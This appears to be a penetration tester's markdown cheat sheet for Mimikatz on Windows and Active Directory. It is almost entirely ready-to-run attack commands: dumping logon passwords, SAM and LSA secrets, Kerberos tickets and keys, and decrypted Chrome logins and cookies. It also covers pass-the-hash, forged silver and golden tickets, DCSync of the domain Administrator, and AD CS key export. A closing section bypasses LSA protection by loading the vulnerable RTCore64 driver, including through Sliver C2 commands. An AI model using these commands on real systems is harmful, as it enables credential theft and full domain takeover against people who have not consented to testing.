---
tags:
  - tool
  - windows
  - active_directory
---
# Mimikatz

Exploit Windows security - [Mimikatz](https://github.com/gentilkiwi/mimikatz)

## Methodology

```powershell
# Grab mimikatz.exe in kali
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
```

## Capabilities

```powershell
# All in one
.\mimikatz.exe privilege::debug sekurlsa::logonpasswords token::elevate lsadump::sam lsadump::secrets token::revert exit

# Allow command execution as another user (RUN BEFORE ALL OTHER COMMANDS)
privilege::debug

# Dump credentials for all users logged on to the current workstation or server, including remote logins
sekurlsa::logonpasswords

# Dump credentials for local accounts
token::elevate
lsadump::sam
lsadump::secrets
token::revert

# Extract kerberos encryption keys
sekurlsa::ekeys

# Extract kerberos tickets (first request is made in a normal shell to cache a service ticket)
# Used in Pass the Ticket and _ attacks
dir \\$FQDN\backup
sekrulsa::tickets /export

# Check exported tickets and inject one (first command made in normal shell)
dir *.kirbi
kerberos::ptt $TICKET.kirbi
# Check if injected ticket was loaded properly (made in normal shell)
klist

# Decrypt chrome data
sekurlsa::dpapi
dpapi::chrome /in:"C:\Users\$USER\AppData\Local\Google\Chrome\User Data\Default\Login Data" /masterkey:$MASTERKEY
dpapi::chrome /in:"C:\Users\$USER\AppData\Local\Google\Chrome\User Data\Default\Cookies" /masterkey:$MASTERKEY

# Perform a pass-the-hash attack
sekurlsa::pth /user:$USER /domain:$DOMAIN /ntlm:$NTHASH /run:powershell

# Create a silver ticket
kerberos::golden /sid:$SID /domain:$DOMAIN /ptt /target:$FQDN /service:http /user:$USER /rc4:$NTHASH 

# Create golden ticket (/patch is used to include the krbtgt hash in the output of lsadump::lsa)
lsadump::lsa /patch
# Purge all tickets before creating the golden ticket to avoid conflicting tickets
kerberos::purge
kerberos::golden /user:$USER /domain:$DOMAIN /sid:$SID /krbtgt:$KRBTGT_NTHASH /ptt
misc::cmd

# Use DCSync to grab a users credentials
lsadump::dcsync /user:$NETBIOS\Administrator
lsadump::dcsync /domain:$DOMAIN /user:$NETBIOS\administrator

# Export private AD CS keys
crypto::capi
crypto::cng
```

Reminder: We can grab our user SID at any point with the command `whoami /user`

## PPL

In the situation we receive the error:

```powershell
mimikatz(commandline) # sekurlsa::logonpasswords                                                                                                                                                                                           
ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
```

This means LSA is currently protected by PPL. We can bypass this with the following technique:

PPLControl.exe - https://github.com/itm4n/PPLcontrol

RTCore64.sys - https://github.com/RedCursorSecurityConsulting/PPLKiller/blob/master/driver/RTCore64.sys

```powershell
# In powershell
sc.exe create RTCore64 type= kernel start= auto binPath= C:\Users\svc_sql\Documents\RTCore64.sys DisplayName= "control"
net start RTCore64
.\PPLcontrol.exe list
.\PPLcontrol.exe unprotect 656

# In sliver
upload /home/kali/staging/RTCore64.sys C:/ProgramData/System/RTCore64.sys
remote-sc-create "" RTCore64 "C:\ProgramData\System\RTCore64.sys" control "Kernel driver service for RTCore64" 1 2 2
remote-sc-start "" RTCore64
ps -e lsass
sideload /home/kali/staging/PPLcontrol.exe unprotect 644
mimikatz privilege::debug sekurlsa::logonpasswords exit
```
